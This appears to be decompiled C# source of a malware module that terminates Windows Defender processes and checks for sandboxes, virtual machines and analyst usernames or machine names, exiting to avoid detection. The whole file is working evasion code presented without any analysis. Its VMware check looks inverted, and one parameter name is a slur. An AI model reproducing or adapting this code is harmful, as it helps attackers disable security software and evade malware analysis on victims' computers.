using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace winini;

public class ant
{
	[DebuggerNonUserCode]
	public ant()
	{
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	public static void mofo()
	{
		seekit("MSASCui");
		seekit("msmpeng");
		antiSandboxie();
		IsVmWare();
		AntiThreatExpert();
		checkUsername();
		checkComputername();
	}

	private static void seekit(string gay1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(gay1))
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static void checkUsername()
	{
		List<string> list = new List<string>();
		list.Add("UserName");
		list.Add("User");
		list.Add("honey");
		list.Add("sandbox");
		list.Add("currentuser");
		list.Add("User");
		foreach (string item in list)
		{
			if (Operators.CompareString(Environment.UserName, item, false) == 0)
			{
				Environment.Exit(0);
			}
		}
	}

	private static void checkComputername()
	{
		List<string> list = new List<string>();
		list.Add("ComputerName");
		list.Add("COMPUTERNAME");
		list.Add("DELL-D3E62F7E26");
		list.Add("DWI-9625AC2E275");
		list.Add("MICHAEL-F156CF7");
		foreach (string item in list)
		{
			if (Operators.CompareString(Environment.MachineName, item, false) == 0)
			{
				Environment.Exit(0);
			}
		}
	}

	public static void antiSandboxie()
	{
		if (Process.GetProcessesByName("SbieSvc").Length >= 1)
		{
			Environment.Exit(0);
		}
	}

	public static void IsVmWare()
	{
		string lpClassName = "VMDragDetectWndClass";
		string lpWindowName = null;
		long num = FindWindowA(ref lpClassName, ref lpWindowName);
		if (num == 0L)
		{
			Environment.Exit(0);
		}
	}

	private static void AntiThreatExpert()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			Environment.Exit(0);
		}
	}
}
